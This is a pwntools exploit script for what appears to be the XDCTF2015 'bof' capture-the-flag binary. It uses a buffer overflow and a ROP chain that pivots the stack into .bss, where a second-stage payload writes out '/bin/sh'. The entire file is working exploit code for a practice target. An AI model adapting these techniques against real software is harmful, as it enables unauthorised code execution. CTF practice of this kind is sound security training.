#!/usr/bin/python3

from pwn import *

fpath = './bof'

io = process(fpath)
elf = ELF(fpath)
read_plt = elf.plt['read']
write_plt = elf.plt['write']

offset = 112

ppp_ret     = 0x08048619 
pop_ebp_ret = 0x0804861b
leave_ret   = 0x08048458

stack_size  = 0x800
bss_addr    = 0x0804a040
base_stage  = bss_addr + stack_size

io.recvuntil('Welcome to XDCTF2015~!\n')
payload  = b'a' * offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)
io.sendline(payload)

cmd = b'/bin/sh'

payload2  = b'aaaa'
payload2 += p32(write_plt)
payload2 += b'aaaa'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += b'a' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'a' * (100 - len(payload2))
io.sendline(payload2)

io.interactive()
